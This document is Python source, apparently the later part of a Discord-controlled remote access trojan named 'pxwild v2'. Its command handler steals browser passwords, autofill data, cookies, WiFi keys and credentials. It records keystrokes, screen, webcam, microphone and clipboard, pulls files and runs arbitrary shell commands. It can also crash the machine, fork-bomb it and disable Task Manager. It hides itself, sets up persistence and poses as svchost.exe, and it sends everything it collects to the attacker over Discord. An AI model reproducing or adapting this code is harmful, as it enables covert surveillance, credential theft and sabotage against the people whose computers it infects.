        elif command.lower().startswith("del "):
            filename = command[4:]
            try:
                if os.path.exists(filename):
                    if os.access(filename, os.W_OK):
                        os.remove(filename)
                        output = f"Deleted: {filename}"
                    else:
                        output = "Permission denied: Cannot delete file"
                else:
                    output = "File not found"
            except Exception as e:
                output = f"Error: {e}"
            return output
        elif command.lower() == "screenshot":
            data = screenshots()
            if data:
                return ('file', data, 'screenshot.png')
            else:
                return "Screenshot failed"
        elif command.lower().startswith("screen_record "):
            duration = int(command[14:])
            if not OPENCV_AVAILABLE or not PIL_AVAILABLE:
                return "OpenCV/PIL not installed. Install with: pip install opencv-python pillow"
            try:
                fourcc = cv2.VideoWriter_fourcc(*'XVID')
                out = cv2.VideoWriter(os.path.join(tempfile.gettempdir(), 'screen_record.avi'), fourcc, 20.0, (1920, 1080))
                start_time = time.time()
                while time.time() - start_time < duration:
                    img = ImageGrab.grab()
                    frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
                    out.write(frame)
                    time.sleep(0.05)
                out.release()
                with open(os.path.join(tempfile.gettempdir(), 'screen_record.avi'), 'rb') as f:
                    video_data = f.read()
                os.remove(os.path.join(tempfile.gettempdir(), 'screen_record.avi'))
                return ('file', video_data, 'screen_record.avi')
            except Exception as e:
                return f"Screen record Error: {e}"
        elif command.lower() == "webcam":
            data = webcams()
            if data:
                return ('file', data, 'webcam.png')
            else:
                return "Webcam failed"
        elif command.lower() == "keylog":
            if start_keylogger():
                return "Keylogger started"
            else:
                return "Keylogger failed to start"
        elif command.lower() == "stoplog":
            stop_keylogger()
            return "Keylogger stopped"
        elif command.lower() == "keylog_dump":
            try:
                if os.path.exists(KEYLOG_FILE):
                    with open(KEYLOG_FILE, 'r', encoding='utf-8') as f:
                        log_data = f.read()
                    return f"Keylog:\n{log_data}"
                else:
                    return "No keylog data"
            except Exception as e:
                return f"Keylog dump error: {e}"
        elif command.lower() == "password":
            return get_saved_passwords()
        elif command.lower() == "autofill":
            af_data = autofills()
            if af_data:
                info = "Autofill Data:\n"
                for item in af_data[:50]:
                    info += f"{item['browser']}: {item['name']} = {item['value']}\n"
                return info
            else:
                return "No autofill data"
        elif command.lower().startswith("open "):
            url = command[5:]
            try:
                webbrowser.open(url)
                return "URL opened"
            except Exception as e:
                return f"Open URL error: {e}"
        elif command.lower() == "bsod":
            if CTYPES_BOOL_ULONG:
                try:
                    ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(c_bool()))
                    ctypes.windll.ntdll.NtRaiseHardError(0xDEAD, 0, 0, 0, 6, ctypes.byref(c_ulong()))
                    return "BSOD triggered"
                except:
                    return "BSOD failed"
            else:
                return "BSOD not available"
        elif command.lower().startswith("msgbox "):
            message_text = command[7:]
            try:
                ctypes.windll.user32.MessageBoxW(0, message_text, "System Message", 0x1000)
                return "Message sent"
            except Exception as e:
                return f"Message Error: {e}"
        elif command.lower().startswith("wallpaper "):
            url = command[10:].strip()
            try:
                r = requests.get(url, timeout=30)
                if r.status_code == 200:
                    if PIL_AVAILABLE:
                        try:
                            img = Image.open(io.BytesIO(r.content))
                            temp_img = os.path.join(tempfile.gettempdir(), 'wallpaper.bmp')
                            if img.mode != 'RGB':
                                img = img.convert('RGB')
                            img.save(temp_img, 'BMP')
                            result = ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_img, 0x01 | 0x02)
                            if result:
                                return "Wallpaper set successfully"
                            else:
                                return "Failed to set wallpaper"
                        except Exception as img_error:
                            return f"Image processing failed: {img_error}"
                    else:
                        temp_img = os.path.join(tempfile.gettempdir(), 'wallpaper.bmp')
                        with open(temp_img, 'wb') as f:
                            f.write(r.content)
                        result = ctypes.windll.user32.SystemParametersInfoW(20, 0, temp_img, 0x01 | 0x02)
                        if result:
                            return "Wallpaper set (direct BMP)"
                        else:
                            return "Failed to set wallpaper - install PIL for better format support"
                else:
                    return f"Failed to download image: HTTP {r.status_code}"
            except Exception as e:
                return f"Wallpaper error: {e}"
        elif command.lower() == "forkbomb":
            try:
                temp_bat = os.path.join(tempfile.gettempdir(), 'fork.bat')
                with open(temp_bat, 'w') as f:
                    f.write(':1\ncls\n:1\nstart\nstart\nstart\ngoto 1')
                subprocess.Popen(temp_bat, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return "Forkbomb initiated"
            except:
                return "Forkbomb failed"
        elif command.lower() == "shutdown":
            try:
                subprocess.run("shutdown /s /t 30", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return "System will shutdown in 30 seconds"
            except Exception as e:
                return f"Error: {e}"
        elif command.lower() == "restart":
            try:
                subprocess.run("shutdown /r /t 30", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return "System will restart in 30 seconds"
            except Exception as e:
                return f"Error: {e}"
        elif command.lower() == "startup":
            try:
                startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                if os.path.exists(startup_path):
                    files = os.listdir(startup_path)
                    output = f"Startup files:\n" + "\n".join(files)
                else:
                    output = "Startup folder not found"
                return output
            except Exception as e:
                return f"Startup Error: {e}"
        elif command.lower() == "netstat":
            try:
                output = subprocess.check_output("netstat -an", shell=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                output = str(e)
            return output
        elif command.lower() == "systeminfo":
            try:
                output = subprocess.check_output("systeminfo", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                output = f"Limited info: {e}\nTry individual commands instead."
            return output
        elif command.lower().startswith("find "):
            filename = command[5:]
            try:
                output = subprocess.check_output(f'dir /s /b "*{filename}*"', shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                output = str(e)
            return output
        elif command.lower() == "wifipasswords":
            try:
                output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                profiles = [line.split(":")[1].strip() for line in output.split('\n') if "All User Profile" in line]
                wifi_passwords = "WiFi Passwords:\n"
                for profile in profiles:
                    try:
                        result = subprocess.check_output(f'netsh wlan show profile "{profile}" key=clear', shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                        for line in result.split('\n'):
                            if "Key Content" in line:
                                password = line.split(":")[1].strip()
                                wifi_passwords += f"{profile}: {password}\n"
                    except:
                        wifi_passwords += f"{profile}: <could not retrieve>\n"
                return wifi_passwords
            except Exception as e:
                return f"Error getting WiFi passwords: {e}"
        elif command.lower() == "browserhistory":
            return get_comprehensive_browser_history()
        elif command.lower() == "cookies":
            try:
                cookie_info = "Cookies (Sessions):\n"
                browsers = [
                    ("Chrome", os.path.join(PATHS['Chrome'], "Default", "Cookies")),
                    ("Edge", os.path.join(PATHS['Edge'], "Default", "Cookies")),
                    ("Brave", os.path.join(PATHS['Brave'], "Default", "Cookies")),
                    ("Vivaldi", os.path.join(PATHS['Vivaldi'], "Default", "Cookies")),
                    ("Yandex", os.path.join(PATHS['Yandex'], "Default", "Cookies")),
                    ("Opera", os.path.join(PATHS['Opera'], "Default", "Cookies")),
                ]
                for browser_name, cookie_db in browsers:
                    if os.path.exists(cookie_db):
                        try:
                            temp_db = os.path.join(tempfile.gettempdir(), f"temp_{browser_name}_cookies")
                            shutil.copy2(cookie_db, temp_db)
                            conn = sqlite3.connect(temp_db)
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%.com' OR host_key LIKE '%.org' ORDER BY creation_utc DESC LIMIT 50")
                            results = cursor.fetchall()
                            if results:
                                cookie_info += f"\n--- {browser_name} ---\n"
                                for host, name, enc_val in results:
                                    if enc_val:
                                        cookie_info += f"{host} - {name}\n"
                            conn.close()
                            os.remove(temp_db)
                        except:
                            pass
                firefox_path = os.path.expanduser("~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles")
                if os.path.exists(firefox_path):
                    for profile in os.listdir(firefox_path):
                        if os.path.isdir(os.path.join(firefox_path, profile)):
                            cookies_db = os.path.join(firefox_path, profile, "cookies.sqlite")
                            if os.path.exists(cookies_db):
                                temp_db = os.path.join(tempfile.gettempdir(), f"temp_firefox_cookies_{profile}")
                                try:
                                    shutil.copy2(cookies_db, temp_db)
                                    conn = sqlite3.connect(temp_db)
                                    cursor = conn.cursor()
                                    cursor.execute("SELECT host, name, value FROM moz_cookies WHERE host LIKE '%.com' OR host LIKE '%.org' ORDER BY lastAccessed DESC LIMIT 50")
                                    results = cursor.fetchall()
                                    if results:
                                        cookie_info += f"\n--- Firefox ({profile}) ---\n"
                                        for host, name, value in results:
                                            cookie_info += f"{host} - {name} = {value}\n"
                                    conn.close()
                                    os.remove(temp_db)
                                except:
                                    pass
                return cookie_info if cookie_info != "Cookies (Sessions):\n" else "No cookies found"
            except Exception as e:
                return f"Error accessing cookies: {e}"
        elif command.lower() == "credentials":
            try:
                output = subprocess.check_output("cmdkey /list", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"Error getting credentials: {e}"
        elif command.lower() == "installed_apps":
            try:
                output = subprocess.check_output("wmic product get name,version", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"Error listing apps: {e}"
        elif command.lower() == "hardware_info":
            try:
                info = "Hardware Info:\n"
                if PSUTIL_AVAILABLE:
                    info += f"CPU: {psutil.cpu_count()} cores\n"
                    info += f"Memory: {psutil.virtual_memory().total / (1024**3):.1f} GB\n"
                    disks = psutil.disk_partitions()
                    for disk in disks[:3]:
                        usage = psutil.disk_usage(disk.mountpoint)
                        info += f"Disk {disk.device}: {usage.total / (1024**3):.1f} GB\n"
                else:
                    info += "psutil not available\n"
                return info
            except Exception as e:
                return f"Hardware error: {e}"
        elif command.lower() == "accounts":
            return get_app_accounts()
        elif command.lower() == "passwords":
            return get_saved_passwords()
        elif command.lower() == "gallery":
            return get_screenshots_gallery()
        elif command.lower() == "downloads":
            return get_downloads_contents()
        elif command.lower().startswith("pullfile "):
            filename = command[9:].strip()
            if not filename:
                return "Please specify a filename. Usage: !pullfile filename.txt"
            return pull_specific_file(filename)
        elif command.lower() == "recent_files":
            try:
                recent_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Recent")
                if os.path.exists(recent_path):
                    files = [f for f in os.listdir(recent_path) if f.endswith(('.lnk', '.url'))][:50]
                    output = "Recent Files:\n" + "\n".join(files)
                else:
                    output = "Recent folder not found"
                return output
            except Exception as e:
                return f"Recent files error: {e}"
        elif command.lower() == "sensitive_files":
            try:
                sensitive_dirs = [
                    os.path.expanduser("~\\Documents"),
                    os.path.expanduser("~\\Desktop"),
                    os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Crypto')
                ]
                output = "Sensitive Files:\n"
                for dir_path in sensitive_dirs:
                    if os.path.exists(dir_path):
                        files = [f for f in os.listdir(dir_path) if '.txt' in f.lower() or '.doc' in f.lower()][:10]
                        if files:
                            output += f"{dir_path}:\n" + "\n".join(files) + "\n"
                return output if output != "Sensitive Files:\n" else "No sensitive files"
            except Exception as e:
                return f"Sensitive files error: {e}"
        elif command.lower() == "mic_record":
            if not PY_AUDIO_AVAILABLE:
                return "PyAudio not installed. Install with: pip install pyaudio"
            try:
                CHUNK = 1024
                FORMAT = pyaudio.paInt16
                CHANNELS = 1
                RATE = 44100
                RECORD_SECONDS = 10
                audio = pyaudio.PyAudio()
                stream = audio.open(format=FORMAT, channels=CHANNELS,
                                  rate=RATE, input=True,
                                  frames_per_buffer=CHUNK)
                frames = []
                for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                    data = stream.read(CHUNK)
                    frames.append(data)
                stream.stop_stream()
                stream.close()
                audio.terminate()
                temp_wav = os.path.join(tempfile.gettempdir(), "recorded_audio.wav")
                wf = wave.open(temp_wav, 'wb')
                wf.setnchannels(CHANNELS)
                wf.setsampwidth(audio.get_sample_size(FORMAT))
                wf.setframerate(RATE)
                wf.writeframes(b''.join(frames))
                wf.close()
                with open(temp_wav, 'rb') as f:
                    audio_data = f.read()
                os.remove(temp_wav)
                return ('file', audio_data, 'recorded_audio.wav')
            except Exception as e:
                return f"Microphone Error: {e}"
        elif command.lower() == "clipboard":
            if not WIN32CLIP_AVAILABLE:
                return "pywin32 not installed. Install with: pip install pywin32"
            try:
                win32clipboard.OpenClipboard()
                data = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                return f"Clipboard: {data}"
            except Exception as e:
                return f"Clipboard Error: {e}"
        elif command.lower().startswith("beep "):
            if WINSOUND_AVAILABLE:
                try:
                    duration = int(command[5:])
                    winsound.Beep(1000, duration)
                    return "Beep played"
                except:
                    return "Beep failed"
            else:
                return "Winsound not available"
        elif command.lower() == "disable_taskmgr":
            try:
                subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return "Task Manager disabled"
            except Exception as e:
                return f"Error: {e}"
        elif command.lower() == "enable_taskmgr":
            try:
                subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return "Task Manager enabled"
            except Exception as e:
                return f"Error: {e}"
        elif command.lower() == "cancel_shutdown":
            try:
                subprocess.run("shutdown /a", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                return "Shutdown cancelled"
            except Exception as e:
                return f"Error: {e}"
        elif command.lower() == "all":
            accounts = get_app_accounts()
            passwords = get_saved_passwords()
            return f"Accounts:\n{accounts}\n\nPasswords:\n{passwords}"
        elif command.lower() == "diskusage":
            try:
                if PSUTIL_AVAILABLE:
                    output = "Disk Usage:\n"
                    for disk in psutil.disk_partitions():
                        usage = psutil.disk_usage(disk.mountpoint)
                        total_gb = usage.total / (1024**3)
                        used_gb = usage.used / (1024**3)
                        free_gb = usage.free / (1024**3)
                        output += f"{disk.device} ({disk.fstype}): {total_gb:.1f} GB total, {used_gb:.1f} GB used, {free_gb:.1f} GB free\n"
                else:
                    output = subprocess.check_output("wmic logicaldisk get caption,size,freespace /format:table", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"Disk usage error: {e}"
        elif command.lower() == "users":
            try:
                output = subprocess.check_output("net user", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"Users error: {e}"
        elif command.lower() == "services":
            try:
                output = subprocess.check_output("sc query state= all", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"Services error: {e}"
        elif command.lower().startswith("start_service "):
            service_name = command[14:]
            try:
                result = subprocess.run(f"sc start {service_name}", shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                output = result.stdout if result.returncode == 0 else f"Failed: {result.stderr}"
            except Exception as e:
                output = f"Error: {e}"
            return output
        elif command.lower().startswith("stop_service "):
            service_name = command[13:]
            try:
                result = subprocess.run(f"sc stop {service_name}", shell=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
                output = result.stdout if result.returncode == 0 else f"Failed: {result.stderr}"
            except Exception as e:
                output = f"Error: {e}"
            return output
        elif command.lower() == "lock":
            try:
                user32.LockWorkStation()
                return "Workstation locked"
            except Exception as e:
                return f"Lock error: {e}"
        elif command.lower() == "env":
            try:
                env_vars = {k: v for k, v in os.environ.items() if not k.startswith('=')}
                output = "\n".join([f"{k}={v}" for k, v in list(env_vars.items())[:50]])
                if len(env_vars) > 50:
                    output += f"\n... and {len(env_vars) - 50} more"
                return output
            except Exception as e:
                return f"Env error: {e}"
        elif command.lower() == "whoami":
            try:
                output = getpass.getuser()
                return output
            except Exception as e:
                return f"Whoami error: {e}"
        elif command.lower() == "eventlog":
            try:
                output = subprocess.check_output("wevtutil qe System /c:20 /rd:true /f:text", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"Event log error: {e}"
        elif command.lower() == "list_drives":
            try:
                output = subprocess.check_output("wmic logicaldisk get deviceid,description", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"List drives error: {e}"
        elif command.lower() == "power_status":
            try:
                if PSUTIL_AVAILABLE:
                    battery = psutil.sensors_battery()
                    if battery:
                        output = f"Battery: {battery.percent}% {'charging' if battery.power_plugged else 'not charging'}"
                    else:
                        output = "No battery info"
                else:
                    output = "psutil not available"
                return output
            except Exception as e:
                return f"Power status error: {e}"
        elif command.lower() == "network_interfaces":
            try:
                if PSUTIL_AVAILABLE:
                    output = "Network Interfaces:\n"
                    for nic, addrs in psutil.net_if_addrs().items():
                        output += f"{nic}:\n"
                        for addr in addrs:
                            output += f" {addr.family.name}: {addr.address}\n"
                else:
                    output = subprocess.check_output("ipconfig /all", shell=True, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except Exception as e:
                return f"Network interfaces error: {e}"
        else:
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, errors='ignore', creationflags=subprocess.CREATE_NO_WINDOW)
                return output
            except subprocess.CalledProcessError as e:
                return e.output
            except Exception as e:
                return str(e)
    except Exception as e:
        return f"Command error: {e}"
def discord_main():
    global connected, processed_messages, user, hostname, ip
    intents = discord.Intents.default()
    intents.message_content = True
    client = discord.Client(intents=intents)
    send_lock = asyncio.Lock()
    async def send_long_reply(message, prefix, output):
        text = str(output)
        if len(text) <= 1900:
            embed = discord.Embed(title=f"root@{user}:~#", description=f"```{text}```", color=0x00ff00)
            embed.set_thumbnail(url="https://files.catbox.moe/jmggya.jpg")
            await message.reply(embed=embed)
        else:
            parts = []
            current = ""
            for line in text.split('\n'):
                if len(current + line + '\n') > 1800:
                    parts.append(current.strip())
                    current = line + '\n'
                else:
                    current += line + '\n'
            if current:
                parts.append(current.strip())
            for i, part in enumerate(parts):
                embed = discord.Embed(title=f"root@{user}:~#", description=f"```{part}```", color=0x00ff00)
                embed.set_thumbnail(url="https://files.catbox.moe/jmggya.jpg")
                if i == 0:
                    await message.reply(embed=embed)
                else:
                    await message.channel.send(embed=embed)
    @client.event
    async def on_ready():
        global user, hostname, ip
        uname = platform.uname()
        user = getpass.getuser()
        hostname = uname.node.lower()
        try:
            ip = requests.get('https://api.ipify.org').text
        except:
            ip = "Unknown"
        channel = client.get_channel(DISCORD_CHANNEL_ID)
        if channel:
            embed = discord.Embed(title="", description=f"# pxwild", color=0x010101)
            embed.add_field(name=f"root@{user}:~#", value=hostname, inline=False)
            embed.set_image(url="https://files.catbox.moe/jmggya.jpg")
            embed.set_footer(text="pxwild v2")
            await channel.send(f"New target: {hostname} [{ip}]", embed=embed)
    @client.event
    async def on_message(message):
        global connected, processed_messages
        async with send_lock:
            if message.author == client.user:
                return
            if message.id in processed_messages:
                return
            processed_messages.add(message.id)
            if message.channel.id != DISCORD_CHANNEL_ID:
                return
            original_content = message.content
            original_cmd = re.sub(r'^<@!?\d+>\s*', '', original_content).strip()
            content_lower = original_cmd.lower()
            if not content_lower:
                return
            if content_lower == '!connect':
                embed = discord.Embed(title="Available Targets:", description=f"1. {user} [{ip}]\n2. {user} [{ip}]", color=0x00ff00)
                embed.set_thumbnail(url="https://files.catbox.moe/jmggya.jpg")
                await message.reply(embed=embed)
                return
            
            if content_lower.startswith('!') and content_lower[1:].isdigit():
                connected = True
                target_num = content_lower[1:]
                embed = discord.Embed(title=f"Connected to Target {target_num} - {user} [{ip}]", color=0x00ff00)
                embed.set_thumbnail(url="https://files.catbox.moe/jmggya.jpg")
                await message.reply(embed=embed)
                return
            
            if content_lower == '!disconnect':
                connected = False
                embed = discord.Embed(title=f"Disconnected from {hostname} [{ip}]", color=0x00ff00)
                embed.set_thumbnail(url="https://files.catbox.moe/jmggya.jpg")
                await message.reply(embed=embed)
                return
            if content_lower == '!clear':
                await message.channel.purge(limit=None)
                return
            if content_lower.startswith('!'):
                cmd_original = original_cmd[1:].strip()
                cmd_lower = content_lower[1:].strip()
                if cmd_lower == 'help':
                    help_text = """System Access:
!connect : Show all available targets
!1, !2, !3 : Connect to any target number
!disconnect : Disconnect from current target
!startup : List startup programs
!execute <command> : Run shell command
!cd <directory> : Change directory
!processes : List running processes
!processkill <pid> : Kill a process by PID
!restart : Restart the system
!keylog : Start Keylogger (NEW)
!stoplog : Stop Keylogger (NEW)
IP Information:
!ip : Get public IP info
!sysinfo : Get system info
Troll Access:
!open <link> : Open a web browser
!bsod : Trigger bluescreen
!msgbox <text> : Show message box
!wallpaper <url> : Set wallpaper attach image
!forkbomb : Rabbit Virus
Device Access:
!screenshot : Take a screenshot
!webcam : Capture webcam image
Credential Dump:
!password : Dump saved passwords
!autofill : Dump saved autofill data
!accounts : Detect owned accounts
!all : All accounts & passwords
New Features:
!gallery : Zip and send all screenshots
!downloads : Show Downloads folder contents
!pullfile <filename> : Search and send specific file
!browserhistory : Last 20 sites from all browsers"""
                    embed = discord.Embed(title=f"root@{user}:~#", description=f"```{help_text}```", color=0x00ff00)
                    embed.set_thumbnail(url="https://files.catbox.moe/jmggya.jpg")
                    await message.reply(embed=embed)
                    return
            if not connected:
                return
            prefix = f"{hostname} [{ip}]:"
            if content_lower.startswith('!'):
                cmd_original = original_cmd[1:].strip()
                cmd_lower = content_lower[1:].strip()
                output = handle_command(cmd_original)
                if isinstance(output, tuple) and len(output) == 3 and output[0] == 'file':
                    _, data, filename = output
                    desc = f"{prefix}\n```{filename}```"
                    embed = discord.Embed(title=f"root@{user}:~#", description=desc, color=0x00ff00)
                    embed.set_thumbnail(url="https://files.catbox.moe/jmggya.jpg")
                    with io.BytesIO(data) as img_buffer:
                        await message.reply(embed=embed, file=discord.File(img_buffer, filename))
                else:
                    await send_long_reply(message, prefix, output)
            else:
                if connected:
                    output = handle_command(original_cmd)
                    await send_long_reply(message, prefix, output)
    try:
        client.run(BOT_TOKEN)
    except:
        pass
def main():
    global processed_messages
    mutex_handle = create_mutex()
    if mutex_handle is None:
        sys.exit(0)
    hide_terminal()
    sys.stdout = open(os.devnull, 'w')
    sys.stderr = open(os.devnull, 'w')
    try:
        setup_persistence()
    except Exception as e:
        pass
    try:
        kernel32.SetConsoleTitleW("svchost.exe")
    except:
        pass
    if not DISCORD_AVAILABLE:
        sys.exit(1)
    if BOT_TOKEN == 'YOUR_BOT_TOKEN_HERE':
        sys.exit(1)
    processed_messages = set()
    discord_main()
if __name__ == "__main__":

    main()
